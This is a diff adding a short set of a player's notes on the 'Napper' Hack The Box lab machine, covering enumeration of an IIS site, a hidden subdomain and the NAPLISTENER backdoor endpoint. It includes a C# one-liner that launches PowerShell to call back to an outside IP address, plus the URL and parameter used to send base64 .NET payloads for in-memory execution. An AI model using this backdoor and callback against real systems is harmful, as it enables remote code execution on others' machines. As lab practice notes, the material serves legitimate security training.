@@ -1,0 +1,31 @@
+This windows box only has a website running on 80 and 443, accessing these ports will simple redirect you to https://app.napper.htb/
+
+Gobuster didnt show much other than the sitemap.xml
+
+The site seems to be a jumble of posts about various topics like .NET, Reverse Engineering, IIS, Golang, etc.
+
+https://app.napper.htb/page/*/ --> May be injectable? [NOT INJECTABLE]
+
+The web-server is an IIS, but we dont have any use of cookies, nor are there any login pages I've found on the base site so far.
+
+Port 7680 is running some kinda of Pando-Pub, possible from kind of FTP related entity.
+
+When using wfuzz to enum subdomains the url must be https if the site is https, otherwise this will give us bad enumeration outputs
+
+We did find a forbidden area in the domain, internal.napper.htb
+To get inside the internal subdom ==> example:ExamplePassword
+
+This NAPLISTENER thats mentioned in the malware notes seems to be a possible Vector, if this is in real-time affecting the machine and is exploitable.
+
+`/ews/MsExgHealthCheckd/ that contains a base64-encoded .NET assembly in the sdafwe3rwe23 parameter will be loaded and executed in memory.`
+
+== C# ==
+
+System.Diagnostics.Process.Start("powershell.exe","Invoke-WebRequest 'http://10.10.15.68:80/?p=NAPLISTENER_RULEZ'");
+
+https://app.napper.htb/ews/MsExgHealthCheckd/?sdafwe3rwe23=b64
+
+== Exploit Grounds Located Here!!! ==
+https://napper.htb/ews/MsExgHealthCheckd/?sdafwe3rwe23=*
+
+https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')URL_Encode(true)&input=[file content here]
